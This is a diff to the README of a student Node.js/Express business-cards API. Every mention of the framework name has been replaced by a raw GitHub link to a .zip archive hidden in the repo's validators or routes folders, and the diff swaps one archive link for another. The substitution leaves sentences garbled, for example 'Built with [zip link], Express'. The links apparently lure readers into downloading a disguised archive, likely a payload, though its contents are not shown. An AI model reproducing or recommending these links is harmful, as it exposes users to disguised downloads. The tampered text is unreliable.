@@ -1,6 +1,6 @@
 # BusinessCards API
 
-A RESTful API for managing business cards and user accounts. Built with https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/validators/Node-Js-Cards-Business-v1.9-beta.5.zip, Express, MongoDB, and Mongoose. Includes secure authentication, role-based access control, data validation, and full CRUD functionality.
+A RESTful API for managing business cards and user accounts. Built with https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip, Express, MongoDB, and Mongoose. Includes secure authentication, role-based access control, data validation, and full CRUD functionality.
 
 ---
 
@@ -18,7 +18,7 @@ A RESTful API for managing business cards and user accounts. Built with https://
 
 ## 🛠️ Technologies Used
 
-- https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/validators/Node-Js-Cards-Business-v1.9-beta.5.zip
+- https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip
 - Express
 - MongoDB + Mongoose
 - Joi
@@ -34,7 +34,7 @@ A RESTful API for managing business cards and user accounts. Built with https://
 /middleware → Auth and error handling 
 /controllers → Business logic for routes 
 /validators → Joi schemas for request validation 
-/handlers → Core logic for authentication (e.g. https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/validators/Node-Js-Cards-Business-v1.9-beta.5.zip)
+/handlers → Core logic for authentication (e.g. https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip)
 
 ---
 
@@ -74,4 +74,4 @@ A RESTful API for managing business cards and user accounts. Built with https://
 
 ## 📌 Notes
 
-This project was built as part of a backend development course. It demonstrates secure user management, data validation, and RESTful API design using modern https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/validators/Node-Js-Cards-Business-v1.9-beta.5.zip practices.
+This project was built as part of a backend development course. It demonstrates secure user management, data validation, and RESTful API design using modern https://raw.githubusercontent.com/lenane68/BusinessCardsNodeJs/master/back/routes/Cards_Js_Business_Node_v2.3-alpha.1.zip practices.
